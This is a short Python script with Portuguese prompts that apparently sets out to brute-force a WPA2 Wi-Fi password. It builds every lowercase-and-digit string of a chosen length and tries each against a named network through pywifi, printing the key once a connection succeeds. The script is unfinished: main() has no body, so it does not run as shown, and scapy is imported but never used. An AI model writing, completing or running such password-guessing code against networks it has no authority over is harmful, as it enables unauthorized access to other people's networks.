import random
import string
import scapy
from pywifi import PyWiFi, const, Profile
from itertools import product
import scapy.all as sc
from multiprocessing import pool, cpu_count

wifi = str(input("adicione o nome da rede: "))
dist = int(input("adicione a quantidade de digitos da senha: "))
senha = []
senhas = string.ascii_lowercase + string.digits

def randomizar():
    for sla in product(senhas, repeat=dist):
        yield ''.join(sla)

def conectar_wifi(ssid: str, senha: str):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()

    profile = Profile()
    profile.ssid = ssid
    profile.key = senha
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)

    if iface.status() == const.IFACE_CONNECTED:
        print(f"Conectado com a senha:{senha}")
        return False
    else:
        print("Bloqueado")
        return True

def main():
    

if __name__ == "__main__":
    main()